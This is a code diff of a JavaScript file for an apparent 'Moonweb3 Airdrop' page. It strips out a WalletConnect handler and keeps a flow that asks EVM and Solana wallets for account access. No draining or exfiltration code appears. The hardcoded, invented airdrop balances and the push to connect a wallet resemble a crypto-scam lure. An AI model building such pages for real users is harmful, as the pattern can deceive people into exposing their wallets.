@@ -3,7 +3,7 @@ const landingSection = document.getElementById("landingSection");
 const connectSection = document.getElementById("connectSection");
 const solanaSection = document.getElementById("solanaSection");
 const proceedBtn = document.getElementById("proceedBtn");
-let connectBtn = document.getElementById("connectBtn"); // original button
+const connectBtn = document.getElementById("connectBtn");
 const solInput = document.getElementById("solAddress");
 const submitSol = document.getElementById("submitSol");
 const progressFill = document.querySelector(".progress > span");
@@ -16,13 +16,10 @@ const evmWalletBtn = document.getElementById("evmWalletBtn");
 const phantomWalletBtn = document.getElementById("phantomWalletBtn");
 const solflareWalletBtn = document.getElementById("solflareWalletBtn");
 
-// ================= USER DATA & WALLETCONNECT CONSTANTS =================
+// ================= USER DATA =================
 const userWalletAddress = "YourWalletHere";
 const userAirdropBalance = 500;
 const previousBalance = 300;
-
-const WALLETCONNECT_PROJECT_ID = '85d1310d55b14854c6d62bab3b779200';
-const NETWORKS = { 56: { rpc: "https://bsc-dataseed.binance.org/" } };
 
 // ================= FLOW =================
 proceedBtn.onclick = () => {
@@ -30,12 +27,11 @@ proceedBtn.onclick = () => {
   connectSection.classList.remove("hidden");
 };
 
-// 🔥 Remove old listeners safely
+// 🔥 REMOVE ALL OLD LISTENERS SAFELY
 connectBtn.replaceWith(connectBtn.cloneNode(true));
-connectBtn = document.getElementById("connectBtn"); // reassign after cloning
-const wcBtn = connectBtn; // WalletConnect button now points to the live button
+const fixedConnectBtn = document.getElementById("connectBtn");
 
-connectBtn.onclick = (e) => {
+fixedConnectBtn.onclick = (e) => {
   e.preventDefault();
   connectSection.classList.add("hidden");
   walletChoiceModal.classList.remove("hidden");
@@ -67,70 +63,26 @@ acceptBtn.onclick = () => {
   airdropPage.classList.remove("hidden");
 };
 
-// ================= WALLETCONNECT HANDLER =================
-let wcProvider;
-let provider;
-let signer;
-let activeProviderType;
-
-wcBtn.onclick = async () => {
-  try {
-    if (wcProvider) {
-      await wcProvider.disconnect().catch(() => {});
-      wcProvider = null;
-    }
-
-    wcBtn.disabled = true;
-    wcBtn.textContent = "Connecting...";
-
-    const { EthereumProvider } = await import(
-      'https://esm.sh/@walletconnect/ethereum-provider@2?bundle'
-    );
-
-    wcProvider = await EthereumProvider.init({
-      projectId: WALLETCONNECT_PROJECT_ID,
-      chains: [56],
-      showQrModal: true,
-      rpcMap: { 56: NETWORKS[56].rpc },
-      metadata: {
-        name: 'Moonweb3 Airdrop',
-        url: window.location.origin
-      }
-    });
-
-    const accounts = await wcProvider.enable();
-    window.ethereum = wcProvider;
-    provider = new ethers.providers.Web3Provider(wcProvider);
-    signer = provider.getSigner();
-    activeProviderType = 'walletconnect';
-
-    await connected();
-  } catch (err) {
-    console.error(err);
-    updateStatusMessage('WalletConnect failed', 'error');
-  }
-
-  wcBtn.disabled = false;
-  wcBtn.textContent = "WalletConnect";
-};
-
 // ================= EVM (MetaMask / Trust / Coinbase) =================
 evmWalletBtn.onclick = async () => {
   walletChoiceModal.classList.add("hidden");
 
+  // Check for injected wallets
   const eth = window.ethereum || window.web3?.currentProvider;
 
   if (!eth) {
+    // For testing: fallback to alert
     alert(
-      "No EVM wallet detected.\nInstall MetaMask, Trust Wallet, or Coinbase."
+      "No EVM wallet detected.\n\nInstall MetaMask, Trust Wallet, or Coinbase Wallet in your browser to test this feature."
     );
     return;
   }
 
   try {
-    const accounts = await (eth.request
-      ? eth.request({ method: "eth_requestAccounts" })
-      : new Promise((res, rej) => eth.enable().then(res).catch(rej)));
+    // Request accounts
+    const accounts = await eth.request
+      ? await eth.request({ method: "eth_requestAccounts" })
+      : await new Promise((res, rej) => eth.enable().then(res).catch(rej));
 
     solInput.value = accounts[0];
     solanaSection.classList.remove("hidden");
@@ -147,7 +99,10 @@ solflareWalletBtn.onclick = connectSolana;
 async function connectSolana() {
   walletChoiceModal.classList.add("hidden");
 
-  const provider = window.phantom?.solana || window.solflare || window.solana;
+  let provider =
+    window.phantom?.solana ||
+    window.solflare ||
+    window.solana;
 
   if (!provider) {
     alert("Open this site in Phantom or Solflare browser.");
@@ -162,25 +117,4 @@ async function connectSolana() {
   } catch {
     alert("Solana wallet connection rejected.");
   }
-}
-
-// ================= POST-CONNECTION FUNCTION =================
-async function connected() {
-  const userWalletEl = document.getElementById('userWallet');
-  const balanceEl = document.getElementById('airdropBalance');
-
-  try {
-    const address = await signer.getAddress();
-    userWalletEl.textContent = address;
-
-    const balance = await provider.getBalance(address);
-    balanceEl.textContent = ethers.utils.formatEther(balance);
-  } catch (err) {
-    console.error("Error fetching wallet info:", err);
-  }
-}
-
-// ================= STATUS MESSAGE HELPER =================
-function updateStatusMessage(msg, type) {
-  console.log(type, msg);
 }
